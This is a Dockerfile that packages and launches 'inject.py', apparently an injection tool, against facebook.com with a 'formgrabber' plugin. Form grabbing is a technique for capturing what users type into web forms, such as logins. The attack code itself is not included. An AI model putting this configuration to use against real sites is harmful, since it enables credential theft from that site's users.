FROM python:3.7-alpine
COPY . /app
WORKDIR /app
RUN pip install -r requirements.txt
CMD [ "python", "-u", "./inject.py", "-u", "https://www.facebook.com", "-P", "formgrabber", "-n"]